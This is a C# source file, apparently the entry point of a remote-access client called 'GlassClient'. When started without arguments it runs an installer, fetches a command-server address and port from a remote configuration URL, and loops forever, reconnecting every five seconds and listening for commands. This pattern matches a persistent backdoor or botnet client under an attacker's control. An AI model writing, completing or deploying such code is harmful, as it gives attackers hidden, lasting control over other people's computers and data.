using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace GlassClient
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length <= 0)
                new GlassInstaller().Install();
            while (true)
            {
                string[] config = new WebClient().DownloadString(Constants.CONFIG_ADDRESS).Split(' ');
                using (GlassConnection connection = new GlassConnection())
                {
                    while (!connection.Connect(config[0], Convert.ToInt32(config[1]))) Thread.Sleep(5000);
                    while (true)
                    {
                        if (!connection.Listen())
                            if (!(connection.SendError("Failed!")))
                                break;
                    }
                }
            }
        }
    }
}
